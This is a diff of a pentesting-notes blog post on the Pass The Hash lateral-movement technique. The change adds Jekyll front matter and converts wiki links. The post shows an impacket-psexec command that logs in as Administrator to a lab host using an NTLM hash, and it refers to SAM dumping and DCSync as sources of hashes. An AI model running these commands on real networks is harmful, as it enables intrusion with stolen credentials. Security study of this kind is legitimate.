@@ -1,4 +1,15 @@
-#Note To extract hashes for a pass the hash, go to [[Dumping SAM]] section or [[DCSync]] section.
+---
+description: >-
+  Pass The Hash
+title: Pass The Hash              # Add title here
+date: 2023-02-08 08:00:00 -0600                           # Change the date to match completion date
+categories: [12 Active Directory, Lateral Movement]             # Change Templates to Writeup
+tags: [active directory, lateral movement, pass the hash]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
+> To extract hashes for a pass the hash, go to [Dumping SAM](https://shuciran.github.io/posts/Dumping-SAM/) section or [DCSync](https://shuciran.github.io/posts/DCSync/) section.
+{: .prompt-tip }
 
 ### Impacket-psexec
 You can use impacket-psexec to pass the hash into winrm service:
@@ -6,7 +17,7 @@ You can use impacket-psexec to pass the hash into winrm service:
 impacket-psexec offsec.local/Administrator:@192.168.143.59 -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5
 ```
 Examples:
-[[Sizzle#^a477a8]]
+[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:impacket-psexec)
 [[Sauna#^]]
 ### Impacket-wmiexec
 ```bash
